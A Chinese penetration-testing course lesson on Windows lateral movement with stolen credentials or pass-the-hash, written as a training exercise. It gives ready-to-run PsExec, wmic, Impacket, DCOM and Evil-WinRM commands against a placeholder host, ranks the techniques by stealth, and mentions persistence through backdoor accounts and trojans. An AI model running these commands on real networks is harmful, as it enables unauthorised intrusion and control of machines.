---
title: Day068：内网渗透 - WMI/DCOM/PsExec 横向移动
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: 4d957
date: 2026-01-28
updated: 2026-01-28
---

# Day068：内网渗透 - WMI/DCOM/PsExec 横向移动

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | WMI/DCOM/PsExec 横向移动 |
| **预计时间** | 3-4 小时 |
| **难度等级** | ⭐⭐⭐⭐ 中高级 |

---

## 🔥 今日痛点场景

> **场景**：你拿到了域管凭据，但目标机器的 445 端口被防火墙封了，常规的 SMB 方式连不上。
>
> **问题**：除了 SMB，还有什么方法能执行远程命令？
>
> **今天的任务**：掌握 WMI、DCOM、PsExec 等多种横向移动技术。

---

## 🎯 今日目标

完成今天的学习后，你应该能够：

- [ ] 使用 WMI 执行远程命令
- [ ] 使用 PsExec 建立远程 shell
- [ ] 使用 DCOM 横向移动
- [ ] 根据场景选择合适的横向技术

**闯关条件**：使用至少两种不同方式成功横向移动到目标机器。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：PsExec 横向移动（30 分钟）

**原理**：通过 SMB 上传服务程序，创建远程服务执行命令。

**使用 Sysinternals PsExec**：
```cmd
:: 使用密码
psexec \\10.0.0.100 -u CORP\Administrator -p Password123 cmd

:: 使用当前凭据（PTH 后）
psexec \\10.0.0.100 cmd
```

**使用 Impacket**：
```bash
# 使用密码
proxychains4 impacket-psexec CORP/Administrator:Password123@10.0.0.100

# 使用 Hash
proxychains4 impacket-psexec CORP/Administrator@10.0.0.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**特点**：会创建服务，留下日志，容易被检测。

---

### 任务 2：WMI 横向移动（40 分钟）

**原理**：使用 Windows 管理规范（WMI）远程执行命令。

**使用 wmic 命令**：
```cmd
:: 远程执行命令（无回显）
wmic /node:10.0.0.100 /user:CORP\Administrator /password:Password123 process call create "cmd /c whoami > c:\result.txt"

:: 读取结果
type \\10.0.0.100\c$\result.txt
```

**使用 Impacket wmiexec**：
```bash
# 交互式 shell
proxychains4 impacket-wmiexec CORP/Administrator:Password123@10.0.0.100

# 使用 Hash
proxychains4 impacket-wmiexec CORP/Administrator@10.0.0.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**特点**：不创建服务，但需要 135 端口。

---

### 任务 3：DCOM 横向移动（30 分钟）

**原理**：利用分布式组件对象模型（DCOM）远程执行。

**使用 Impacket dcomexec**：
```bash
# 使用 MMC20.Application
proxychains4 impacket-dcomexec CORP/Administrator:Password123@10.0.0.100

# 使用不同的 DCOM 对象
proxychains4 impacket-dcomexec -object MMC20 CORP/Administrator@10.0.0.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

**PowerShell DCOM**：
```powershell
# 使用 MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.100"))
$com.Document.ActiveView.ExecuteShellCommand("cmd","/c whoami > c:\test.txt","","7")
```

---

### 任务 4：SMBExec 横向移动（20 分钟）

**原理**：类似 PsExec，但不上传可执行文件。

```bash
proxychains4 impacket-smbexec CORP/Administrator:Password123@10.0.0.100

proxychains4 impacket-smbexec CORP/Administrator@10.0.0.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 任务 5：WinRM 横向移动（20 分钟）

**前提**：目标开放 5985/5986 端口。

```bash
# 使用 Evil-WinRM
proxychains4 evil-winrm -i 10.0.0.100 -u Administrator -p Password123

# 使用 Hash
proxychains4 evil-winrm -i 10.0.0.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**PowerShell**：
```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName 10.0.0.100 -Credential $cred
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| PsExec 横向成功 | ⬜ |
| WMI 横向成功 | ⬜ |
| DCOM 横向成功 | ⬜ |
| WinRM 横向成功 | ⬜ |
| 理解各技术的区别 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### 横向移动技术对比

| 技术 | 端口 | 特点 | 隐蔽性 |
|------|------|------|--------|
| PsExec | 445 | 创建服务 | 低 |
| WMI | 135 | 无文件 | 中 |
| DCOM | 135 | 无服务 | 中 |
| SMBExec | 445 | 无文件 | 中 |
| WinRM | 5985 | PowerShell | 高 |

### 选择指南

| 场景 | 推荐技术 |
|------|----------|
| 445 开放 | PsExec / SMBExec |
| 只有 135 | WMI / DCOM |
| 只有 5985 | WinRM |
| 要隐蔽 | WinRM / WMI |
| 要稳定 | PsExec |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 防火墙拦截 | 连接超时 | 换端口/换技术 |
| UAC 限制 | 拒绝访问 | 需要本地管理员 |
| WinRM 未启用 | 端口未开 | 只能用其他方式 |
| 凭据错误 | 认证失败 | 检查用户名格式 |

---

## 💡 知识卡片速查

### Impacket 工具集

| 工具 | 用途 | 端口 |
|------|------|------|
| psexec | 创建服务执行 | 445 |
| wmiexec | WMI 执行 | 135 |
| smbexec | SMB 执行 | 445 |
| dcomexec | DCOM 执行 | 135 |
| atexec | 计划任务执行 | 445 |

---

## ❓ 常见问题

**Q1：哪种方式最隐蔽？**

A1：WinRM 最隐蔽，其次是 WMI。PsExec 会创建服务，最容易被发现。

**Q2：目标没有开放任何端口怎么办？**

A2：无法直接横向移动，需要先找其他入口或利用内网其他机器做跳板。

**Q3：横向移动后怎么维持权限？**

A3：可以创建后门账户、植入木马、或添加计划任务。

---

## 🚀 明日预告

**Day 069：内网渗透 - Kerberos 认证与黄金票据**

明天你将：
- 理解 Kerberos 认证流程
- 学习黄金票据和白银票据
- 实战 Kerberoasting 攻击

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> 横向移动不只有 PTH。实战中端口被封是常事，必须掌握多种技术。
>
> Impacket 是 Linux 横向移动的标配工具集，务必熟练使用。
>
> 记住：工具是死的，思路是活的。不行就换一种方式。

```bash
echo "Day 068 Complete! 横向移动技术掌握！"
```
